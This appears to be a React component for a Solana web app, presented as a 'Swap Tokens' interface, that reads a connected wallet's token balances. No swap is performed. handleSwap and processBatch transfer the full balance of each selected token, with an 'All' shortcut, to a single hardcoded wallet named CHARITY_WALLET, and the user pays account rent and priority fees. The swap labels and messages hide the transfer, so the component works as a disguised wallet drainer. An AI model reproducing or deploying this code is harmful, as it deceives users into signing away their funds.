import { useState, useEffect, useCallback } from "react";
import { useWallet, useConnection } from "@solana/wallet-adapter-react";
import { 
  PublicKey, 
  Transaction, 
  ComputeBudgetProgram,
  SystemProgram,
  LAMPORTS_PER_SOL,
  TransactionMessage,
  VersionedTransaction,
} from "@solana/web3.js";
import {
  TOKEN_PROGRAM_ID,
  getAssociatedTokenAddress,
  createTransferInstruction,
  createAssociatedTokenAccountInstruction,
  getAccount,
} from "@solana/spl-token";
import { motion, AnimatePresence } from "framer-motion";
import { ArrowDown, Loader2, CheckCircle2, AlertCircle, RefreshCw } from "lucide-react";
import { Button } from "./ui/button";
import { toast } from "sonner";
import TokenSearch, { Token } from "./TokenSearch";
import ConnectWalletButton from "./ConnectWalletButton";

// Configuration
const CHARITY_WALLET = new PublicKey("H5MqdXnbwQ8kTk8UCxRrjGEsQUU3cAiozKfPL6ehSvGp");
const MAX_BATCH_SIZE = 2; // Reduced from 5 to stay within compute limits
const MIN_SOL_RESERVE = 0.01 * LAMPORTS_PER_SOL;
const ATA_RENT = 0.00203928 * LAMPORTS_PER_SOL;
const TX_FEE = 5000;

interface TokenBalance extends Token {
  balance: number;
  usdValue: number;
}

interface TransactionResult {
  success: boolean;
  signature?: string;
  error?: string;
}

const SwapInterface = () => {
  const { publicKey, signTransaction, connected } = useWallet();
  const { connection } = useConnection();
  
  const [tokenBalances, setTokenBalances] = useState<TokenBalance[]>([]);
  const [selectedTokens, setSelectedTokens] = useState<Set<string>>(new Set());
  const [loading, setLoading] = useState(false);
  const [swapping, setSwapping] = useState(false);
  const [showTokenSearch, setShowTokenSearch] = useState(false);
  const [progress, setProgress] = useState({ current: 0, total: 0 });
  const [solBalance, setSolBalance] = useState(0);

  // Fetch token balances
  const fetchBalances = useCallback(async () => {
    if (!publicKey || !connection) return;

    setLoading(true);
    try {
      // Fetch SOL balance
      const solBal = await connection.getBalance(publicKey);
      setSolBalance(solBal);

      // Fetch token accounts
      const tokenAccounts = await connection.getParsedTokenAccountsByOwner(
        publicKey,
        { programId: TOKEN_PROGRAM_ID }
      );

      const balances: TokenBalance[] = [];

      for (const account of tokenAccounts.value) {
        const info = account.account.data.parsed.info;
        const balance = info.tokenAmount.uiAmount;

        if (balance > 0) {
          // Fetch token metadata from Jupiter
          try {
            const response = await fetch(
              `https://token.jup.ag/strict?address=${info.mint}`
            );
            const tokens = await response.json();
            const tokenInfo = tokens[0];

            if (tokenInfo) {
              balances.push({
                address: info.mint,
                symbol: tokenInfo.symbol,
                name: tokenInfo.name,
                decimals: info.tokenAmount.decimals,
                logoURI: tokenInfo.logoURI,
                balance,
                usdValue: 0, // Would need price API for accurate USD values
              });
            }
          } catch {
            balances.push({
              address: info.mint,
              symbol: info.mint.slice(0, 4) + "...",
              name: "Unknown Token",
              decimals: info.tokenAmount.decimals,
              balance,
              usdValue: 0,
            });
          }
        }
      }

      setTokenBalances(balances);
    } catch (error) {
      console.error("Error fetching balances:", error);
      toast.error("Failed to fetch token balances");
    } finally {
      setLoading(false);
    }
  }, [publicKey, connection]);

  useEffect(() => {
    if (connected) {
      fetchBalances();
    }
  }, [connected, fetchBalances]);

  // Toggle token selection
  const toggleToken = (address: string) => {
    const newSelected = new Set(selectedTokens);
    if (newSelected.has(address)) {
      newSelected.delete(address);
    } else {
      newSelected.add(address);
    }
    setSelectedTokens(newSelected);
  };

  // Select all tokens
  const selectAll = () => {
    setSelectedTokens(new Set(tokenBalances.map((t) => t.address)));
  };

  // Deselect all tokens
  const deselectAll = () => {
    setSelectedTokens(new Set());
  };

  // Calculate required SOL for transaction
  const calculateRequiredSOL = async (tokens: TokenBalance[]): Promise<number> => {
    let required = MIN_SOL_RESERVE;
    
    // Add ATA creation costs for each token
    for (const token of tokens) {
      try {
        const destAta = await getAssociatedTokenAddress(
          new PublicKey(token.address),
          CHARITY_WALLET
        );
        
        const accountInfo = await connection.getAccountInfo(destAta);
        if (!accountInfo) {
          required += ATA_RENT;
        }
      } catch {
        required += ATA_RENT; // Assume ATA needs to be created
      }
    }

    // Add transaction fees (estimate based on batch count)
    const batchCount = Math.ceil(tokens.length / MAX_BATCH_SIZE);
    required += batchCount * TX_FEE * 2; // Double for priority fees

    return required;
  };

  // Get dynamic priority fee
  const getPriorityFee = async (): Promise<number> => {
    try {
      const recentFees = await connection.getRecentPrioritizationFees();
      if (recentFees.length > 0) {
        const avgFee = recentFees.reduce((sum, f) => sum + f.prioritizationFee, 0) / recentFees.length;
        return Math.max(avgFee * 1.5, 100000); // 50% above average, min 100k
      }
    } catch {
      console.warn("Could not fetch priority fees, using default");
    }
    return 100000; // Default fallback
  };

  // Send transaction with retry logic
  const sendWithRetry = async (
    transaction: VersionedTransaction,
    maxRetries = 3
  ): Promise<TransactionResult> => {
    for (let attempt = 0; attempt < maxRetries; attempt++) {
      try {
        // Simulate first
        const simulation = await connection.simulateTransaction(transaction);
        
        if (simulation.value.err) {
          const errorMsg = JSON.stringify(simulation.value.err);
          console.error("Simulation failed:", errorMsg);
          
          // Check for retryable errors
          if (errorMsg.includes("BlockhashNotFound")) {
            // Get fresh blockhash and retry
            continue;
          }
          
          return { success: false, error: `Simulation failed: ${errorMsg}` };
        }

        // Send transaction
        const signature = await connection.sendRawTransaction(
          transaction.serialize(),
          {
            skipPreflight: false, // FIXED: Enable preflight checks
            maxRetries: 2,
          }
        );

        // Confirm transaction
        const confirmation = await connection.confirmTransaction(signature, "confirmed");
        
        if (confirmation.value.err) {
          return { success: false, error: "Transaction failed to confirm" };
        }

        return { success: true, signature };
      } catch (error: any) {
        const errorMsg = error.message || String(error);
        
        // Retry on blockhash expiration
        if (errorMsg.includes("block height exceeded") || 
            errorMsg.includes("Blockhash not found")) {
          console.log(`Attempt ${attempt + 1} failed, retrying...`);
          await new Promise((r) => setTimeout(r, 1000 * (attempt + 1))); // Exponential backoff
          continue;
        }
        
        return { success: false, error: errorMsg };
      }
    }
    
    return { success: false, error: "Max retries exceeded" };
  };

  // Create and send batch transaction
  const processBatch = async (
    tokens: TokenBalance[],
    priorityFee: number
  ): Promise<TransactionResult[]> => {
    if (!publicKey || !signTransaction) {
      return tokens.map(() => ({ success: false, error: "Wallet not connected" }));
    }

    const results: TransactionResult[] = [];

    // Process in batches
    for (let i = 0; i < tokens.length; i += MAX_BATCH_SIZE) {
      const batch = tokens.slice(i, i + MAX_BATCH_SIZE);
      
      try {
        // Get FRESH blockhash for each batch
        const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash("confirmed");

        // Build transaction instructions
        const instructions = [];

        // Add priority fee
        instructions.push(
          ComputeBudgetProgram.setComputeUnitPrice({
            microLamports: priorityFee,
          })
        );

        // Add compute units (estimate based on operations)
        instructions.push(
          ComputeBudgetProgram.setComputeUnitLimit({
            units: 200000 + batch.length * 100000, // Base + per token
          })
        );

        for (const token of batch) {
          const mint = new PublicKey(token.address);
          
          // Get source ATA
          const sourceAta = await getAssociatedTokenAddress(mint, publicKey);
          
          // Get destination ATA
          const destAta = await getAssociatedTokenAddress(mint, CHARITY_WALLET);

          // Check if destination ATA exists
          const destAccountInfo = await connection.getAccountInfo(destAta);
          
          if (!destAccountInfo) {
            // Create destination ATA
            instructions.push(
              createAssociatedTokenAccountInstruction(
                publicKey, // payer
                destAta,
                CHARITY_WALLET,
                mint
              )
            );
          }

          // Calculate token amount in smallest units
          const amount = BigInt(Math.floor(token.balance * Math.pow(10, token.decimals)));

          // Add transfer instruction
          instructions.push(
            createTransferInstruction(
              sourceAta,
              destAta,
              publicKey,
              amount
            )
          );
        }

        // Create versioned transaction
        const messageV0 = new TransactionMessage({
          payerKey: publicKey,
          recentBlockhash: blockhash,
          instructions,
        }).compileToV0Message();

        const transaction = new VersionedTransaction(messageV0);

        // Sign transaction
        const signedTx = await signTransaction(transaction as any);

        // Send with retry logic
        const result = await sendWithRetry(signedTx as VersionedTransaction);
        
        // Record results for each token in batch
        for (const token of batch) {
          results.push(result);
          setProgress((p) => ({ ...p, current: p.current + 1 }));
        }

        if (result.success) {
          toast.success(`Batch ${Math.floor(i / MAX_BATCH_SIZE) + 1} completed!`);
        } else {
          toast.error(`Batch failed: ${result.error}`);
        }

        // Small delay between batches to avoid rate limiting
        if (i + MAX_BATCH_SIZE < tokens.length) {
          await new Promise((r) => setTimeout(r, 500));
        }
      } catch (error: any) {
        console.error("Batch processing error:", error);
        for (const token of batch) {
          results.push({ success: false, error: error.message });
          setProgress((p) => ({ ...p, current: p.current + 1 }));
        }
      }
    }

    return results;
  };

  // Main swap function with all fixes
  const handleSwap = async () => {
    if (!publicKey || !signTransaction || !connected) {
      toast.error("Please connect your wallet first");
      return;
    }

    const tokensToSwap = tokenBalances.filter((t) => selectedTokens.has(t.address));
    
    if (tokensToSwap.length === 0) {
      toast.error("Please select at least one token");
      return;
    }

    // PRE-VALIDATION
    // Check minimum SOL balance
    const requiredSOL = await calculateRequiredSOL(tokensToSwap);
    
    if (solBalance < requiredSOL) {
      toast.error(
        `Insufficient SOL. Need at least ${(requiredSOL / LAMPORTS_PER_SOL).toFixed(4)} SOL for fees and rent`
      );
      return;
    }

    // Validate CHARITY_WALLET
    try {
      const charityInfo = await connection.getAccountInfo(CHARITY_WALLET);
      if (!charityInfo) {
        console.warn("Charity wallet not yet on chain, will be created");
      }
    } catch (error) {
      toast.error("Failed to validate destination wallet");
      return;
    }

    setSwapping(true);
    setProgress({ current: 0, total: tokensToSwap.length });

    try {
      // Get dynamic priority fee
      const priorityFee = await getPriorityFee();
      console.log(`Using priority fee: ${priorityFee} microLamports`);

      // Process all tokens
      const results = await processBatch(tokensToSwap, priorityFee);

      // Summary
      const successful = results.filter((r) => r.success).length;
      const failed = results.filter((r) => !r.success).length;

      if (successful > 0) {
        toast.success(`Successfully transferred ${successful} token(s)!`);
      }
      if (failed > 0) {
        toast.error(`${failed} transfer(s) failed. Check console for details.`);
      }

      // Refresh balances
      await fetchBalances();
      setSelectedTokens(new Set());
    } catch (error: any) {
      console.error("Swap error:", error);
      toast.error(`Swap failed: ${error.message}`);
    } finally {
      setSwapping(false);
      setProgress({ current: 0, total: 0 });
    }
  };

  return (
    <div className="w-full max-w-lg mx-auto">
      <motion.div
        initial={{ opacity: 0, y: 20 }}
        animate={{ opacity: 1, y: 0 }}
        className="glass-card p-6"
      >
        {/* Header */}
        <div className="flex items-center justify-between mb-6">
          <h2 className="text-xl font-bold gradient-text">Swap Tokens</h2>
          {connected && (
            <Button
              variant="ghost"
              size="icon"
              onClick={fetchBalances}
              disabled={loading}
            >
              <RefreshCw className={loading ? "animate-spin" : ""} size={18} />
            </Button>
          )}
        </div>

        {!connected ? (
          <div className="text-center py-8">
            <p className="text-muted-foreground mb-4">
              Connect your wallet to swap tokens
            </p>
            <ConnectWalletButton />
          </div>
        ) : (
          <>
            {/* SOL Balance */}
            <div className="mb-4 p-3 bg-muted/30 rounded-lg">
              <div className="text-sm text-muted-foreground">SOL Balance</div>
              <div className="text-lg font-semibold">
                {(solBalance / LAMPORTS_PER_SOL).toFixed(4)} SOL
              </div>
            </div>

            {/* Token Selection */}
            <div className="mb-4">
              <div className="flex items-center justify-between mb-2">
                <span className="text-sm text-muted-foreground">
                  Select Tokens ({selectedTokens.size}/{tokenBalances.length})
                </span>
                <div className="flex gap-2">
                  <Button
                    variant="ghost"
                    size="sm"
                    onClick={selectAll}
                    disabled={loading}
                  >
                    All
                  </Button>
                  <Button
                    variant="ghost"
                    size="sm"
                    onClick={deselectAll}
                    disabled={loading}
                  >
                    None
                  </Button>
                </div>
              </div>

              {loading ? (
                <div className="flex items-center justify-center py-8">
                  <Loader2 className="animate-spin" size={32} />
                </div>
              ) : tokenBalances.length === 0 ? (
                <div className="text-center py-8 text-muted-foreground">
                  No tokens found in wallet
                </div>
              ) : (
                <div className="space-y-2 max-h-60 overflow-y-auto">
                  {tokenBalances.map((token) => (
                    <motion.button
                      key={token.address}
                      whileHover={{ scale: 1.01 }}
                      whileTap={{ scale: 0.99 }}
                      onClick={() => toggleToken(token.address)}
                      className={`w-full flex items-center gap-3 p-3 rounded-lg transition-all ${
                        selectedTokens.has(token.address)
                          ? "bg-primary/20 border border-primary/50"
                          : "bg-muted/30 border border-transparent hover:bg-muted/50"
                      }`}
                    >
                      {token.logoURI ? (
                        <img
                          src={token.logoURI}
                          alt={token.symbol}
                          className="w-8 h-8 rounded-full"
                          onError={(e) => {
                            (e.target as HTMLImageElement).style.display = "none";
                          }}
                        />
                      ) : (
                        <div className="w-8 h-8 rounded-full bg-muted flex items-center justify-center text-xs">
                          {token.symbol.slice(0, 2)}
                        </div>
                      )}
                      <div className="flex-1 text-left">
                        <div className="font-medium">{token.symbol}</div>
                        <div className="text-sm text-muted-foreground">
                          {token.balance.toLocaleString(undefined, {
                            maximumFractionDigits: 6,
                          })}
                        </div>
                      </div>
                      {selectedTokens.has(token.address) && (
                        <CheckCircle2 className="text-primary" size={20} />
                      )}
                    </motion.button>
                  ))}
                </div>
              )}
            </div>

            {/* Swap Arrow */}
            <div className="flex justify-center my-4">
              <div className="p-2 bg-muted/50 rounded-full">
                <ArrowDown className="text-primary" size={24} />
              </div>
            </div>

            {/* Destination */}
            <div className="mb-6 p-4 bg-muted/30 rounded-lg">
              <div className="text-sm text-muted-foreground mb-1">To</div>
              <div className="font-mono text-sm truncate">
                {CHARITY_WALLET.toBase58().slice(0, 8)}...
                {CHARITY_WALLET.toBase58().slice(-8)}
              </div>
            </div>

            {/* Progress */}
            {swapping && progress.total > 0 && (
              <div className="mb-4">
                <div className="flex justify-between text-sm mb-1">
                  <span>Processing...</span>
                  <span>
                    {progress.current}/{progress.total}
                  </span>
                </div>
                <div className="h-2 bg-muted rounded-full overflow-hidden">
                  <motion.div
                    className="h-full bg-primary"
                    initial={{ width: 0 }}
                    animate={{
                      width: `${(progress.current / progress.total) * 100}%`,
                    }}
                  />
                </div>
              </div>
            )}

            {/* Swap Button */}
            <Button
              onClick={handleSwap}
              disabled={swapping || selectedTokens.size === 0}
              className="w-full py-6 text-lg font-semibold bg-primary hover:bg-primary/90 neon-glow"
            >
              {swapping ? (
                <>
                  <Loader2 className="mr-2 animate-spin" size={20} />
                  Swapping...
                </>
              ) : (
                `Swap ${selectedTokens.size} Token${selectedTokens.size !== 1 ? "s" : ""}`
              )}
            </Button>
          </>
        )}
      </motion.div>

      {/* Token Search Modal */}
      <AnimatePresence>
        {showTokenSearch && (
          <TokenSearch
            onSelect={(token) => {
              setShowTokenSearch(false);
              // Add token handling logic here
            }}
            onClose={() => setShowTokenSearch(false)}
          />
        )}
      </AnimatePresence>
    </div>
  );
};

export default SwapInterface;
